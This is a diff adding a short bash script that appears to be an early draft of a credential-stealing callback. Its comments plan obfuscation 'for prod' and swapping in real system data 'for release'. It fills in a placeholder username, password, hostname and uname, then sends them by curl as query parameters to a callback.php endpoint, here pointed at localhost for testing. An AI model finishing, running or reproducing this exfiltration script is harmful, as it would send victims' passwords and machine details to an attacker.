@@ -1,0 +1,14 @@
+#!/bin/bash
+
+# TODO for prod: obfuscate
+
+user="user"  # TODO
+pass="user's password"  # TODO
+hostname="User's Desktop"  # (we hope!); TODO
+uname="Linux"  # replace with uname -a for release
+
+# confirm branch
+curl "https://127.0.0.1:8000/.git/HEAD"
+
+# check that callback works
+curl "https://127.0.0.1:8000/callback.php?user=${user}&pass=${pass}&host=${hostname}&uname=${uname}"
